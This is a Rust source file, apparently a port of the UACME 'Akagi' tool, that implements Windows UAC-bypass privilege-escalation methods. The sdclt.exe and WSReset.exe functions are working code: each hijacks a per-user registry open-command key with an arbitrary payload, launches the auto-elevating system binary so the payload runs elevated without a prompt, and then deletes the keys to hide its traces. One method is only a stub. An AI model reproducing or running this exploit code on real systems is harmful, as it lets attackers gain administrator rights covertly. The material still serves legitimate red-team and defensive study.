// Azagarampur's UAC bypass methods
// Port of Source/Akagi/methods/azagarampur.c

use crate::context::*;
use crate::methods::*;
use shared::*;
use windows::core::PCWSTR;

/// Method 52: Directory Mock
/// Mock trusted directory to bypass UAC
pub fn method_directory_mock(ctx: &mut UacmeContext, params: &MethodParams) -> MethodResult {
    log::info!("[Method 52] Directory Mock");
    
    log::warn!("Directory Mock method not fully implemented");
    constants::STATUS_NOT_IMPLEMENTED
}

/// Method 53: Shell Sdclt
/// Bypass UAC using sdclt.exe with registry hijacking
pub fn method_shell_sdclt(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 53] Shell Sdclt");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    // Similar to fodhelper method
    sdclt_registry_hijack(&payload_str)
}

/// Method 56: Shell WSReset
/// Bypass UAC using WSReset.exe
pub fn method_shell_wsreset(ctx: &mut UacmeContext, _params: &MethodParams) -> MethodResult {
    log::info!("[Method 56] Shell WSReset");
    
    let payload = ctx.get_payload();
    let payload_str = from_wide_string(&payload);
    
    wsreset_registry_hijack(&payload_str)
}

/// Sdclt registry hijack
fn sdclt_registry_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\Folder\shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\Folder\\shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch sdclt.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let sdclt = format!("{}sdclt.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&sdclt), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let folder_path = to_wide_string("Software\\Classes\\Folder");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(folder_path.as_ptr()));
        
        result
    }
}

/// WSReset registry hijack
fn wsreset_registry_hijack(payload: &str) -> MethodResult {
    use windows::Win32::System::Registry::*;
    use windows::Win32::Foundation::*;
    
    // HKCU\Software\Classes\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\Shell\open\command
    let reg_path = to_wide_string("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command");
    
    unsafe {
        let key_result = winapi_ext::RegistryKey::create(
            HKEY_CURRENT_USER,
            &reg_path,
            KEY_WRITE.0,
        );
        
        let key = match key_result {
            Ok(k) => k,
            Err(e) => {
                log::error!("Failed to create registry key: {}", e);
                return constants::STATUS_ACCESS_DENIED;
            }
        };
        
        let payload_wide = to_wide_string(payload);
        let empty_wide = to_wide_string("");
        
        if key.set_string_value(&empty_wide, &payload_wide).is_err() {
            return constants::STATUS_ACCESS_DENIED;
        }
        
        let delegate_wide = to_wide_string("DelegateExecute");
        let _ = key.set_string_value(&delegate_wide, &empty_wide);
        
        // Launch WSReset.exe
        let sys_dir = query_system_directory(true);
        let sys_dir_str = from_wide_string(&sys_dir);
        let wsreset = format!("{}WSReset.exe", sys_dir_str);
        
        let result = match winapi_ext::create_process_simple(&to_wide_string(&wsreset), None, 1) {
            Ok(pi) => {
                let _ = CloseHandle(pi.hProcess);
                let _ = CloseHandle(pi.hThread);
                std::thread::sleep(std::time::Duration::from_secs(3));
                constants::STATUS_SUCCESS
            }
            Err(_) => constants::STATUS_ACCESS_DENIED,
        };
        
        // Cleanup
        let appx_path = to_wide_string("Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2");
        let _ = RegDeleteTreeW(HKEY_CURRENT_USER, PCWSTR(appx_path.as_ptr()));
        
        result
    }
}

